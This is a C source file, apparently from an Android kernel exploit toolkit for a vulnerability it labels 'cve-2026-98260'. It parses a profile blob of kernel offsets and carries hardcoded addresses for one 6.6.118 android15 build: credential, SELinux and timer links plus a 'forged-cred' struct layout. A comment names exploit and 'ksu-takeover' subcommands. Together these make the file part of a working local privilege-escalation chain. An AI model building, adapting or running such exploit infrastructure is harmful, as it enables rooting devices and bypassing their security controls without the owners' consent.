/*
 * kernel_table.c - kernel offset table parsing (APK built-in version)
 *
 * Reads from stdin a '4-byte big-endian length + fixed-size binary blob',
 * the blob is serialized by the Kotlin-side KernelProfileSerializer in a fixed layout.
 *
 * Blob layout (all little-endian). Three layout revisions exist:
 *   version 2 = 256 bytes (no task_alloc_link)  —— still accepted as the MINIMUM.
 *   version 3 = 264 bytes (adds task_alloc_link at offset 256).
 *   version 4 = 308 bytes (adds cred_off[11] at offset 264)  —— current.
 *
 * Field map (offsets are identical for v2 and v3; only the tail differs):
 *   0    char   magic[4]        = "C982"
 *   4    u16    version         = 4
 *   6    u16    flags           (bit0 = recommend_shizuku)
 *   8    u64    page_offset
 *   16   u64    timer_link
 *   24   u64    cred_link
 *   32   u64    selinux_link
 *   40   u64    user_ns
 *   48   u64    root_user
 *   56   u64    groups
 *   64   u64    ucounts
 *   72   u32    task_cred
 *   76   u32    task_struct_size
 *   80   u32    cred_uid
 *   84   u32    kitimer_node
 *   88   char   release[128]
 *   216  char   vuln_type[32]
 *   248  u64    kitimer_size
 *   256  u64    task_alloc_link   (added in version 3)
 *   264  u32    cred_size         (added in version 4)
 *   268  u32    cred_cap_inh
 *   272  u32    cred_cap_perm
 *   276  u32    cred_cap_eff
 *   280  u32    cred_cap_bset
 *   284  u32    cred_cap_amb
 *   288  u32    cred_off_security
 *   292  u32    cred_off_user
 *   296  u32    cred_off_user_ns
 *   300  u32    cred_off_ucounts
 *   304  u32    cred_off_groups
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include "kernel_table.h"

#define BLOB_MAGIC "C982"
#define BLOB_VERSION 4
/* v2 blobs are still accepted: they simply carry no task_alloc_link. */
#define BLOB_VERSION_MIN 2
/* Minimum accepted size (v2, no task_alloc_link). Used only for the length gate. */
#define BLOB_SIZE_V2 256
/* v3 adds task_alloc_link; v4 adds the forged-cred layout (B4). */
#define BLOB_SIZE_V3 264
#define BLOB_SIZE_V4 308
#define BLOB_SIZE BLOB_SIZE_V4

static struct kernel_offsets g_offsets;
static int g_offsets_loaded = 0;

/* ---- little-endian reads, to avoid host/target byte-order differences ---- */
static uint16_t rd_u16(const uint8_t *p) {
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static uint32_t rd_u32(const uint8_t *p) {
    return (uint32_t)p[0]
         | ((uint32_t)p[1] << 8)
         | ((uint32_t)p[2] << 16)
         | ((uint32_t)p[3] << 24);
}

static uint64_t rd_u64(const uint8_t *p) {
    return (uint64_t)rd_u32(p) | ((uint64_t)rd_u32(p + 4) << 32);
}

static void copy_str(char *dst, size_t dst_size, const char *src, size_t src_size) {
    size_t n = strnlen(src, src_size);
    if (n >= dst_size) n = dst_size - 1;
    memcpy(dst, src, n);
    dst[n] = '\0';
}

/*
 * Forged-cred layout defaults = android15-8 (6.6.x / 6.12.x / 6.18.x).
 * Applied whenever a v2/v3 blob arrives (no cred fields) so profiles written
 * before blob v4 keep behaving exactly as they did.
 */
static void apply_cred_defaults(struct kernel_offsets *o) {
    o->cred_size = 184;
    o->cred_cap_inh = 48;
    o->cred_cap_perm = 56;
    o->cred_cap_eff = 64;
    o->cred_cap_bset = 72;
    o->cred_cap_amb = 80;
    o->cred_off_security = 128;
    o->cred_off_user = 136;
    o->cred_off_user_ns = 144;
    o->cred_off_ucounts = 152;
    o->cred_off_groups = 160;
}

/* built-in fallback: PKJ110 6.6.118 (still runs when assets are missing) */
static void load_builtin_fallback(void) {
    memset(&g_offsets, 0, sizeof(g_offsets));
    copy_str(g_offsets.release, sizeof(g_offsets.release),
             "6.6.118-android15-8-g9bc34d5b0c79-abogki537459655-4k", 128);
    copy_str(g_offsets.vuln_type, sizeof(g_offsets.vuln_type), "cve-2026-98260", 32);
    g_offsets.page_offset = 0xffffff7f80000000ULL;
    g_offsets.timer_link = 0xffffffc0801a4dfcULL;
    g_offsets.cred_link = 0xffffffc0800e4074ULL;
    g_offsets.selinux_link = 0xffffffc08239c620ULL;
    g_offsets.user_ns = 0xffffffc08216f450ULL;
    g_offsets.root_user = 0xffffffc08216f6e0ULL;
    g_offsets.groups = 0xffffffc082170c40ULL;
    g_offsets.ucounts = 0xffffffc0821711b0ULL;
    g_offsets.task_cred = 0x820;
    g_offsets.task_struct_size = 0x12c0;
    g_offsets.cred_uid = 0x8;
    g_offsets.kitimer_node = 0x78;
    g_offsets.kitimer_size = 0x108ULL;
    apply_cred_defaults(&g_offsets);
    g_offsets_loaded = 1;
}

/* parse the fixed-size blob */
static int parse_blob(const uint8_t *blob, uint32_t length) {
    if (length < BLOB_SIZE_V2) {
        fprintf(stderr, "[config] error: profile blob too short (%u < %d)\n", length, BLOB_SIZE_V2);
        return -1;
    }
    if (memcmp(blob, BLOB_MAGIC, 4) != 0) {
        fprintf(stderr, "[config] error: profile magic mismatch\n");
        return -1;
    }
    uint16_t version = rd_u16(blob + 4);
    if (version < BLOB_VERSION_MIN || version > BLOB_VERSION) {
        fprintf(stderr, "[config] error: profile version unsupported (v%u)\n", version);
        return -1;
    }

    memset(&g_offsets, 0, sizeof(g_offsets));
    g_offsets.page_offset      = rd_u64(blob + 8);
    g_offsets.timer_link       = rd_u64(blob + 16);
    g_offsets.cred_link        = rd_u64(blob + 24);
    g_offsets.selinux_link     = rd_u64(blob + 32);
    g_offsets.user_ns          = rd_u64(blob + 40);
    g_offsets.root_user        = rd_u64(blob + 48);
    g_offsets.groups           = rd_u64(blob + 56);
    g_offsets.ucounts          = rd_u64(blob + 64);
    g_offsets.task_cred        = rd_u32(blob + 72);
    g_offsets.task_struct_size = rd_u32(blob + 76);
    g_offsets.cred_uid         = rd_u32(blob + 80);
    g_offsets.kitimer_node     = rd_u32(blob + 84);
    copy_str(g_offsets.release, sizeof(g_offsets.release),
             (const char *)(blob + 88), 128);
    copy_str(g_offsets.vuln_type, sizeof(g_offsets.vuln_type),
             (const char *)(blob + 216), 32);
    g_offsets.kitimer_size = rd_u64(blob + 248);
    g_offsets.task_alloc_link = (version >= 3 && length >= 264) ? rd_u64(blob + 256) : 0;

    if (version >= 4 && length >= BLOB_SIZE_V4) {
        g_offsets.cred_size        = rd_u32(blob + 264);
        g_offsets.cred_cap_inh     = rd_u32(blob + 268);
        g_offsets.cred_cap_perm    = rd_u32(blob + 272);
        g_offsets.cred_cap_eff     = rd_u32(blob + 276);
        g_offsets.cred_cap_bset    = rd_u32(blob + 280);
        g_offsets.cred_cap_amb     = rd_u32(blob + 284);
        g_offsets.cred_off_security = rd_u32(blob + 288);
        g_offsets.cred_off_user    = rd_u32(blob + 292);
        g_offsets.cred_off_user_ns = rd_u32(blob + 296);
        g_offsets.cred_off_ucounts = rd_u32(blob + 300);
        g_offsets.cred_off_groups  = rd_u32(blob + 304);
        /* Boundary validation: the last field must fit inside sizeof(struct cred). */
        if (g_offsets.cred_size < 64 || g_offsets.cred_size > 4096 ||
            g_offsets.cred_off_groups + 8 > g_offsets.cred_size) {
            fprintf(stderr, "[config] warn: cred layout invalid, using 6.6 defaults\n");
            apply_cred_defaults(&g_offsets);
        }
    } else {
        apply_cred_defaults(&g_offsets);
    }

    /* integrity check: critical fields must not be 0 */
    if (!g_offsets.timer_link || !g_offsets.cred_link || !g_offsets.selinux_link) {
        fprintf(stderr, "[config] error: profile critical offsets missing\n");
        return -1;
    }

    g_offsets_loaded = 1;
    fprintf(stdout, "[config] loaded kernel table: %s\n", g_offsets.release);
    return 0;
}

int kernel_table_load_from_stdin(void) {
    uint8_t len_buf[4];

    /* read the 4-byte big-endian length */
    if (fread(len_buf, 1, 4, stdin) != 4) {
        fprintf(stdout, "[config] warn: no profile received, using built-in fallback table\n");
        load_builtin_fallback();
        return 0;
    }
    uint32_t length = ((uint32_t)len_buf[0] << 24)
                    | ((uint32_t)len_buf[1] << 16)
                    | ((uint32_t)len_buf[2] << 8)
                    |  (uint32_t)len_buf[3];

    if (length == 0 || length > 1024 * 1024) {
        fprintf(stderr, "[config] error: profile length invalid (%u), using built-in fallback table\n", length);
        load_builtin_fallback();
        return 0;
    }

    uint8_t *blob = malloc(length);
    if (!blob) {
        fprintf(stderr, "[config] error: memory allocation failed, using built-in fallback table\n");
        load_builtin_fallback();
        return 0;
    }
    if (fread(blob, 1, length, stdin) != length) {
        fprintf(stderr, "[config] error: profile data incomplete, using built-in fallback table\n");
        free(blob);
        load_builtin_fallback();
        return 0;
    }

    int rc = parse_blob(blob, length);
    free(blob);
    if (rc != 0) {
        fprintf(stderr, "[config] parse failed, falling back to built-in table\n");
        load_builtin_fallback();
    }
    return 0;
}

const struct kernel_offsets *kernel_table_get(void) {
    if (!g_offsets_loaded) {
        load_builtin_fallback();
    }
    return &g_offsets;
}

void kernel_table_dump(void) {
    const struct kernel_offsets *o = kernel_table_get();
    printf("[config] release: %s\n", o->release);
    printf("[config] vuln_type: %s\n", o->vuln_type);
    printf("[config] page_offset: 0x%llx\n", (unsigned long long)o->page_offset);
    printf("[config] timer_link: 0x%llx\n", (unsigned long long)o->timer_link);
    printf("[config] cred_link: 0x%llx\n", (unsigned long long)o->cred_link);
    printf("[config] selinux_link: 0x%llx\n", (unsigned long long)o->selinux_link);
    printf("[config] kitimer_size: 0x%llx\n", (unsigned long long)o->kitimer_size);
    printf("[config] task_alloc_link: 0x%llx\n", (unsigned long long)o->task_alloc_link);
    printf("[config] cred: size=%u caps=%u/%u/%u/%u/%u sec=%u user=%u ns=%u uc=%u grp=%u\n",
           o->cred_size, o->cred_cap_inh, o->cred_cap_perm, o->cred_cap_eff,
           o->cred_cap_bset, o->cred_cap_amb, o->cred_off_security,
           o->cred_off_user, o->cred_off_user_ns, o->cred_off_ucounts, o->cred_off_groups);
}

/*
 * R4：日志按需打印。
 *
 * 原先 main.c 对每条需要 profile 的子命令（calibrate-a/calibrate-b/exploit/
 * ksu-takeover）都无条件调用 kernel_table_dump()，一轮流程会打印 4 次共 32 行
 * [config]，把真正有用的阶段打点（[slide]/[task]/[plant]…）淹没，也白白增加
 * 日志 tailer 的转发量。
 *
 * 现在改为按需：环境变量 C98260_DUMP=1 时才打印全量。加载成功/回落时的一行
 * 摘要仍由 kernel_table_load_from_stdin() 发出，排查所需信息没有丢失；
 * 需要完整表时用 `libcve98260.so dump-config` 或设 C98260_DUMP=1。
 */
void kernel_table_dump_if_requested(void) {
    const char *v = getenv("C98260_DUMP");
    if (v && *v && strcmp(v, "0") != 0) {
        kernel_table_dump();
    }
}
